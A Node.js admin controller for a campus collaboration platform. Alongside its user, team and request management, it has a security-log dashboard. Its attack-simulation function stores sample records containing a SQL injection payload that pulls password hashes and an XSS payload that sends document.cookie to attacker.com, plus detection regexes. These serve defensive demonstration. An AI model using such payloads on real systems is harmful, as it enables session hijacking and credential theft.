const User = require('../models/userModel');
const Request = require('../models/requestModel');
const Contact = require('../models/contactModel');
const Team = require('../models/teamModel');
const SecurityLog = require('../models/securityLogModel');
const Question = require('../models/questionModel');

const getAllUsers = async (req, res) => {
  try {
    const currentUserId = req.user ? req.user._id : null;
    // Exclude the currently logged-in administrator from the candidates/users list
    const query = currentUserId ? { _id: { $ne: currentUserId } } : {};
    const users = await User.find(query).select('-password').sort({ createdAt: -1 });
    return res.json({ success: true, count: users.length, users });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getAdminStats = async (req, res) => {
  try {
    const users = await User.find({}, 'role department');
    const totalRequests = await Request.countDocuments();
    const totalInquiries = await Contact.countDocuments();
    const totalTeams = await Team.countDocuments();
    const totalQuestions = await Question.countDocuments();

    const studentCount = users.filter((u) => u.role !== 'admin').length;
    const adminCount = users.filter((u) => u.role === 'admin').length;
    const deptMap = {};
    users.forEach((u) => {
      const dept = u.department || 'General';
      deptMap[dept] = (deptMap[dept] || 0) + 1;
    });
    const departments = Object.keys(deptMap).map((d) => ({ _id: d, count: deptMap[d] }));

    return res.json({
      success: true,
      stats: {
        totalUsers: users.length,
        studentCount,
        adminCount,
        totalRequests,
        totalInquiries,
        totalTeams,
        totalQuestions,
        departments,
      },
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const deleteUser = async (req, res) => {
  try {
    if (req.user && req.user._id.toString() === req.params.id) {
      return res.status(400).json({ success: false, message: 'You cannot delete your own admin account.' });
    }
    const targetUser = await User.findById(req.params.id);
    if (!targetUser) {
      return res.status(404).json({ success: false, message: 'Candidate not found.' });
    }
    if (targetUser.role === 'admin' && targetUser.email === (process.env.ADMIN_EMAIL || 'admin@campuscollab.edu')) {
      return res.status(400).json({ success: false, message: 'Primary administrator account cannot be deleted.' });
    }
    await User.deleteOne({ _id: req.params.id });
    return res.json({ success: true, message: 'Candidate removed successfully.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getAllRequestsAdmin = async (req, res) => {
  try {
    const requests = await Request.find()
      .populate('sender recipient', 'name email department skills')
      .sort({ createdAt: -1 });

    return res.json({ success: true, count: requests.length, requests });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getAllInquiriesAdmin = async (req, res) => {
  try {
    const inquiries = await Contact.find().sort({ createdAt: -1 });
    return res.json({ success: true, count: inquiries.length, inquiries });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const deleteInquiryAdmin = async (req, res) => {
  try {
    await Contact.deleteOne({ _id: req.params.id });
    return res.json({ success: true, message: 'Inquiry removed.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getAllTeamsAdmin = async (req, res) => {
  try {
    const teams = await Team.find()
      .populate('lead members', 'name email department')
      .sort({ createdAt: -1 });

    return res.json({ success: true, count: teams.length, teams });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const deleteTeamAdmin = async (req, res) => {
  try {
    await Team.deleteOne({ _id: req.params.id });
    return res.json({ success: true, message: 'Team removed.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const deleteRequestAdmin = async (req, res) => {
  try {
    await Request.deleteOne({ _id: req.params.id });
    return res.json({ success: true, message: 'Request removed successfully.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getUserLogsAdmin = async (req, res) => {
  try {
    const users = await User.find().select('-password').sort({ createdAt: -1 });
    const teams = await Team.find({}, 'lead members');
    const requests = await Request.find({}, 'sender recipient requestType status');

    const enrichedLogs = users.map((u) => {
      const uId = u._id.toString();
      const teamsCount = teams.filter(
        (t) => (t.lead && t.lead.toString() === uId) || (t.members || []).some((m) => m && m.toString() === uId)
      ).length;
      const leadingTeamsCount = teams.filter((t) => t.lead && t.lead.toString() === uId).length;
      const requestsSent = requests.filter((r) => r.sender && r.sender.toString() === uId).length;
      const requestsReceived = requests.filter((r) => r.recipient && r.recipient.toString() === uId).length;

      return {
        _id: u._id,
        name: u.name,
        email: u.email,
        role: u.role || 'user',
        department: u.department || 'General',
        skills: u.skills || 'Not specified',
        openToWork: u.openToWork ?? true,
        ranking: u.ranking || 'Contributor',
        rankingPoints: u.rankingPoints ?? 850,
        bio: u.bio || 'No bio provided',
        githubUrl: u.githubUrl || '',
        githubUsername: u.githubStats?.username || '',
        githubPublicRepos: u.githubStats?.publicRepos ?? (u.repositories?.length || 0),
        githubStars: u.githubStats?.totalStars ?? 0,
        githubFollowers: u.githubStats?.followers ?? 0,
        projectsCount: u.projects?.length || 0,
        projects: u.projects || [],
        repositoriesCount: u.repositories?.length || 0,
        repositories: u.repositories || [],
        teamsCount,
        leadingTeamsCount,
        requestsSent,
        requestsReceived,
        createdAt: u.createdAt,
        updatedAt: u.updatedAt,
      };
    });

    return res.json({ success: true, count: enrichedLogs.length, logs: enrichedLogs });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const getSecurityLogsAdmin = async (req, res) => {
  try {
    const { search, threatLevel, attackType, statusCode, timeRange, limit = 100 } = req.query;

    // Purge any dummy sample seed records so the log only contains real data
    await SecurityLog.deleteMany({
      $or: [
        { userEmail: /campuscollab\.edu/i },
        { userEmail: /darknet\.org/i },
        { userEmail: /darkweb\.io/i },
        { ipAddress: { $in: ['185.220.101.45', '45.142.214.18', '194.26.29.112', '103.203.57.88', '112.196.44.15', '185.191.171.3'] } }
      ]
    });

    const query = {};

    if (threatLevel && threatLevel !== 'ALL') {
      query.threatLevel = threatLevel;
    }

    if (attackType && attackType !== 'ALL') {
      query.attackType = attackType;
    }

    if (statusCode && statusCode !== 'ALL') {
      query.statusCode = Number(statusCode);
    }

    if (timeRange && timeRange !== 'ALL') {
      const now = new Date();
      if (timeRange === '1h') query.createdAt = { $gte: new Date(now - 60 * 60 * 1000) };
      else if (timeRange === '24h') query.createdAt = { $gte: new Date(now - 24 * 60 * 60 * 1000) };
      else if (timeRange === '7d') query.createdAt = { $gte: new Date(now - 7 * 24 * 60 * 60 * 1000) };
    }

    if (search && search.trim()) {
      const regex = new RegExp(search.trim(), 'i');
      query.$or = [
        { ipAddress: regex },
        { endpoint: regex },
        { userEmail: regex },
        { userAgent: regex },
        { browser: regex },
        { os: regex },
        { attackType: regex },
        { suspiciousIndicators: regex },
        { requestPayloadSnippet: regex },
      ];
    }

    const logs = await SecurityLog.find(query)
      .sort({ createdAt: -1 })
      .limit(Number(limit))
      .populate('userId', 'name email department role');

    // Aggregate key SOC statistics
    const totalLogs = await SecurityLog.countDocuments();
    const criticalThreats = await SecurityLog.countDocuments({ threatLevel: 'Critical' });
    const highThreats = await SecurityLog.countDocuments({ threatLevel: 'High' });
    const blockedCount = await SecurityLog.countDocuments({ isBlocked: true });
    const uniqueIps = await SecurityLog.distinct('ipAddress', { threatLevel: { $ne: 'Normal' } });

    return res.json({
      success: true,
      count: logs.length,
      stats: {
        totalLogs,
        criticalThreats,
        highThreats,
        blockedCount,
        uniqueAttackerIpsCount: uniqueIps.length,
      },
      logs,
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const simulateTestAttackAdmin = async (req, res) => {
  try {
    const { attackVariant } = req.body;
    let newLog;

    if (attackVariant === 'sqli') {
      newLog = await SecurityLog.create({
        ipAddress: '185.220.101.' + Math.floor(Math.random() * 200 + 10),
        method: 'POST',
        endpoint: '/api/auth/login',
        statusCode: 401,
        responseTimeMs: 24,
        threatLevel: 'Critical',
        attackType: 'SQL / NoSQL Injection',
        userAgent: 'sqlmap/1.8.1#dev (https://sqlmap.org)',
        browser: 'sqlmap (Exploit Tool)',
        os: 'Kali Linux (Security Tool)',
        deviceType: 'Automated Tool / Bot',
        userEmail: "admin@campuscare.com (Targeted in Attack)",
        userRole: 'guest',
        requestHeaders: { host: 'campuscollab.edu', hasAuthToken: false },
        queryParams: {},
        requestPayloadSnippet: `{"email":"admin' UNION SELECT 1,username,password_hash FROM users--","password":"***REDACTED***"}`,
        suspiciousIndicators: [
          'Detected SQL/NoSQL Injection signature: /union\\s+select/i',
          'Automated database takeover tool User-Agent: sqlmap/1.8.1',
          'Intrusion blocked and logged to SOC database'
        ],
        isBlocked: true,
        originHost: 'campuscollab.edu',
      });
    } else if (attackVariant === 'xss') {
      newLog = await SecurityLog.create({
        ipAddress: '203.0.113.' + Math.floor(Math.random() * 200 + 10),
        method: 'GET',
        endpoint: '/api/peers?search=<img src=x onerror=fetch("http://attacker.com/cookie?c="+document.cookie)>',
        statusCode: 200,
        responseTimeMs: 32,
        threatLevel: 'High',
        attackType: 'XSS Injection Attempt',
        userAgent: 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 Chrome/123.0.0.0 Safari/537.36',
        browser: 'Google Chrome',
        os: 'macOS',
        deviceType: 'Desktop',
        userEmail: 'student-victim@campuscare.edu',
        userRole: 'user',
        requestHeaders: { host: 'campuscollab.edu', hasAuthToken: false },
        queryParams: { search: '<img src=x onerror=fetch("http://attacker.com/cookie?c="+document.cookie)>' },
        requestPayloadSnippet: '',
        suspiciousIndicators: [
          'Detected Stored/Reflected XSS pattern: /<img[^>]+onerror/i',
          'Attempted remote session hijacking callback'
        ],
        isBlocked: false,
        originHost: 'campuscollab.edu',
      });
    } else {
      newLog = await SecurityLog.create({
        ipAddress: '91.240.118.' + Math.floor(Math.random() * 200 + 10),
        method: 'GET',
        endpoint: '/api/admin/system/env?token=admin',
        statusCode: 403,
        responseTimeMs: 11,
        threatLevel: 'Critical',
        attackType: 'Unauthorized Admin Access',
        userAgent: 'Nikto/2.5.0 (OSVDB-3092)',
        browser: 'Nikto Scanner',
        os: 'Linux',
        deviceType: 'Automated Tool / Bot',
        userEmail: 'Not Logged In (Attacker: 91.240.118.x)',
        userRole: 'guest',
        requestHeaders: { host: 'campuscollab.edu', hasAuthToken: false },
        queryParams: { token: 'admin' },
        requestPayloadSnippet: '',
        suspiciousIndicators: [
          'Direct privileged endpoint enumeration probe by Nikto Web Scanner',
          'Attempted unauthorized extraction of environment variables',
          'Strictly blocked with 403 Forbidden'
        ],
        isBlocked: true,
        originHost: 'campuscollab.edu',
      });
    }

    return res.status(201).json({
      success: true,
      message: 'Simulated attack payload recorded and flagged in security log ledger!',
      log: newLog,
    });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

const clearSecurityLogsAdmin = async (req, res) => {
  try {
    await SecurityLog.deleteMany({});
    return res.json({ success: true, message: 'Security audit logs cleared successfully.' });
  } catch (error) {
    return res.status(500).json({ success: false, message: error.message });
  }
};

module.exports = {
  getAllUsers,
  getAdminStats,
  deleteUser,
  getAllRequestsAdmin,
  deleteRequestAdmin,
  getAllInquiriesAdmin,
  deleteInquiryAdmin,
  getAllTeamsAdmin,
  deleteTeamAdmin,
  getUserLogsAdmin,
  getSecurityLogsAdmin,
  simulateTestAttackAdmin,
  clearSecurityLogsAdmin,
};
